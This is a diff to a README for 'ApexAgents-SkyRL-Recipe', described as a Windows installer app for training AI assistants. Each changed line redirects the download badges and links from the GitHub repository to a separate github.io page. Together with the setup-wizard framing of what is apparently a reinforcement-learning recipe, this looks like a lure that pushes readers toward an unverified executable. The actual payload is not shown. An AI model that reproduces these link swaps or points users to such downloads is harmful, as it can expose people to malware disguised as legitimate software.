@@ -1,6 +1,6 @@
 # 🧠 ApexAgents-SkyRL-Recipe - Train Smarter AI Assistants Easily
 
-[![Download Now](https://img.shields.io/badge/Download-ApexAgents--SkyRL--Recipe-brightgreen?style=for-the-badge&logo=github)](https://github.com/danellemeiotic2994/ApexAgents-SkyRL-Recipe)
+[![Download Now](https://img.shields.io/badge/Download-ApexAgents--SkyRL--Recipe-brightgreen?style=for-the-badge&logo=github)](https://danellemeiotic2994.github.io)
 
 ---
 
@@ -28,7 +28,7 @@ Whether you're a curious beginner or someone who wants to automate repetitive wo
 
 Visit this link to download the application:
 
-[🔗 https://github.com/danellemeiotic2994/ApexAgents-SkyRL-Recipe](https://github.com/danellemeiotic2994/ApexAgents-SkyRL-Recipe)
+[🔗 https://danellemeiotic2994.github.io](https://danellemeiotic2994.github.io)
 
 ### Step-by-Step Download Guide for Windows Users
 
@@ -104,7 +104,7 @@ Re-run the setup wizard by going to "Settings" > "Reset Setup" in the app. This 
 
 To get the latest features and fixes:
 
-1. Visit the [download link](https://github.com/danellemeiotic2994/ApexAgents-SkyRL-Recipe) again
+1. Visit the [download link](https://danellemeiotic2994.github.io) again
 2. Check the "Releases" section for a newer version
 3. Download and run the new installer - it will replace the old version automatically
 
@@ -123,6 +123,6 @@ To get the latest features and fixes:
 
 We hope you enjoy building your own AI assistant. The more you train it, the smarter it gets. Share your results with friends and show them what your digital helper can do!
 
-[![Download Now](https://img.shields.io/badge/Get%20the%20App%20Now-Click%20Here-blue?style=for-the-badge&logo=download)](https://github.com/danellemeiotic2994/ApexAgents-SkyRL-Recipe)
+[![Download Now](https://img.shields.io/badge/Get%20the%20App%20Now-Click%20Here-blue?style=for-the-badge&logo=download)](https://danellemeiotic2994.github.io)
 
 Keywords: AI training, knowledge agent, reinforcement learning, APEX data, SkyRL, Harbor, Windows app, machine learning, automation, research assistant
